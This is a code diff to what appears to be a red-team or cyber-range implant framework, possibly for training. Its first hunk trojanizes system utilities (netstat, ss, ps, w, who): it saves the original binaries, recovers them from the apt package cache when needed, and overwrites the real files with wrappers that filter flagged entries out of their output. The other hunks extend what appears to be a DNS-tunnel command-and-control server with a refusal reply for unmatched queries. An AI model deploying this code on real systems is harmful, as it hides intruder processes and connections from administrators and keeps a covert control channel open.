@@ -420,22 +420,61 @@ def linux_tradecraft(action, opts):
             "hold={hold}/bin\n"
             "mkdir -p \"$hold\"\n"
             "chmod 700 {holdroot}\n"
+            "good_orig() {{\n"
+            "  [ -f \"$1\" ] && [ ! -L \"$1\" ] && ! grep -q RANGE-VEIL \"$1\" 2>/dev/null\n"
+            "}}\n"
+            "save_orig() {{\n"
+            "  src=$1\n"
+            "  dest=$2\n"
+            "  if ! good_orig \"$src\"; then return 1; fi\n"
+            "  rm -f \"$dest\"\n"
+            "  cp -L \"$src\" \"$dest\" && chmod 755 \"$dest\"\n"
+            "}}\n"
+            "recover_orig() {{\n"
+            "  name=$1\n"
+            "  dest=$2\n"
+            "  case \"$name\" in\n"
+            "    netstat) pkg=net-tools ;;\n"
+            "    ss) pkg=iproute2 ;;\n"
+            "    ps|w) pkg=procps ;;\n"
+            "    who) pkg=coreutils ;;\n"
+            "    *) return 1 ;;\n"
+            "  esac\n"
+            "  deb=$(ls -1 /var/cache/apt/archives/${{pkg}}_*.deb 2>/dev/null | tail -n 1)\n"
+            "  [ -n \"$deb\" ] || return 1\n"
+            "  tmp=$(mktemp -d)\n"
+            "  dpkg-deb -x \"$deb\" \"$tmp\" || {{ rm -rf \"$tmp\"; return 1; }}\n"
+            "  found=$(find \"$tmp\" -type f -name \"$name\" | head -n 1)\n"
+            "  if [ -z \"$found\" ]; then rm -rf \"$tmp\"; return 1; fi\n"
+            "  cp -L \"$found\" \"$dest\" && chmod 755 \"$dest\"\n"
+            "  rm -rf \"$tmp\"\n"
+            "  echo RESTORED=$name\n"
+            "}}\n"
             "veil_one() {{\n"
             "  name=$1\n"
             "  path=$(command -v \"$name\" 2>/dev/null || true)\n"
             "  if [ -z \"$path\" ]; then echo SKIP=$name; return; fi\n"
-            "  if ! grep -q RANGE-VEIL \"$path\" 2>/dev/null; then\n"
-            "    cp -a \"$path\" \"$hold/$name.orig\"\n"
-            "    echo COPIED=$path\n"
+            "  real=$(readlink -f \"$path\" 2>/dev/null || echo \"$path\")\n"
+            "  if ! good_orig \"$hold/$name.orig\"; then\n"
+            "    if ! save_orig \"$real\" \"$hold/$name.orig\"; then\n"
+            "      recover_orig \"$name\" \"$hold/$name.orig\" || {{ echo LOST=$name; return; }}\n"
+            "    else\n"
+            "      echo COPIED=$real\n"
+            "    fi\n"
             "  fi\n"
-            "  cat > \"$path\" << 'EOF'\n"
+            "  numeric=\n"
+            "  if [ \"$name\" = netstat ]; then numeric='-n '; fi\n"
+            "  cat > \"$real\" << 'EOF'\n"
             "#!/bin/bash\n"
             "# RANGE-VEIL\n"
-            "{real} \"$@\" | grep -v -F {flags} || true\n"
+            "orig={{real}}\n"
+            "if [ ! -f \"$orig\" ] || [ -L \"$orig\" ] || grep -q RANGE-VEIL \"$orig\" 2>/dev/null; then echo BROKEN; exit 1; fi\n"
+            "\"$orig\" {{numeric}}\"$@\" | grep -v -F {flags} || true\n"
             "EOF\n"
-            "  sed -i \"s#{{real}}#$hold/$name.orig#\" \"$path\"\n"
-            "  chmod 755 \"$path\"\n"
-            "  echo VEILED=$path\n"
+            "  sed -i \"s#{{real}}#$hold/$name.orig#\" \"$real\"\n"
+            "  sed -i \"s#{{numeric}}#$numeric#\" \"$real\"\n"
+            "  chmod 755 \"$real\"\n"
+            "  echo VEILED=$real\n"
             "}}\n"
             + "".join("veil_one {0}\n".format(name) for name in VEIL_TOOLS)
             + "echo DONE\n"
@@ -889,6 +928,21 @@ def dns_build_response(query, txt):
         rdata += struct.pack("B", len(chunk)) + chunk
     answer = struct.pack("!HHHIH", 0xC00C, 16, 1, 0, len(rdata)) + rdata
     return header + question + answer
+
+
+def dns_refuse(query):
+    if len(query) < 12:
+        return None
+    tid = query[:2]
+    try:
+        _name, qend = dns_decode_name(query, 12)
+        question = query[12 : qend + 4]
+        qd = 1
+    except Exception:
+        question = b""
+        qd = 0
+    header = tid + struct.pack("!HHHHH", 0x8005, qd, 0, 0, 0)
+    return header + question
 
 
 def dns_parse_txt(packet):
@@ -2825,6 +2879,9 @@ def serve_dns(hub, token, bind, port, zone):
             qname, _end = dns_decode_name(data, 12)
             kind = dns_classify(qname, zone)
             if not kind:
+                reply = dns_refuse(data)
+                if reply:
+                    sock.sendto(reply, addr)
                 continue
             mode, sid, text = kind
             if mode == "up" and text:
